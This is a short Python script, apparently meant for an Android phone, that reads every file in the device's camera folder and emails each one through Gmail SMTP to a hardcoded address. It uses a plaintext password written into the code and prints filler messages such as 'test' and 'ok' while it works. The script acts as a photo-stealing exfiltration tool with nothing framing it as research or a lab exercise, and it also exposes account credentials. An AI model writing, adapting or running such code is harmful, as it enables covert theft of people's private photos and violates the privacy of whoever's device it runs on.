import smtplib
import os
os.chdir("/storage/emulated/0/DCIM/Camera")
a = os.listdir()

frm = 'dkild996@gmail.com'
pas = '0919959525'
to = 'dkild996@gmail.com'

print('test')
for i in a:
    print('plise withe')
    s = open(i , 'rb')
    ms = s.read()
    ser = smtplib.SMTP_SSL('smtp.gmail.com')
    ser.login(frm , pas)
    ser.sendmail(frm , to , ms)
    ser.quit()
    print('ok')
    s.close()